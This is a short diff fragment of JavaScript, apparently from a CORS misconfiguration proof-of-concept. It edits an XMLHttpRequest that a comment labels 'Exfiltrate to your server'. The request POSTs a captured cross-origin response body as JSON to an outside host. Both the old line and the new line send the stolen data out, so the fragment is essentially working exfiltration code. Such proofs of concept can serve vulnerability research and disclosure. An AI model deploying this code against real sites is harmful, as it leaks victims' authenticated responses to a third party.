@@ -15,7 +15,7 @@
 
         // Optional: Exfiltrate to your server
         var exfil = new XMLHttpRequest();
-        exfil.open("POST", "https://hunter-4321.github.io/cors-poc/", true);
+        exfil.open("POST", "https://hunter-4321.github.io", true);
         exfil.setRequestHeader("Content-Type", "application/json");
         exfil.send(JSON.stringify({ response: this.responseText }));
       };
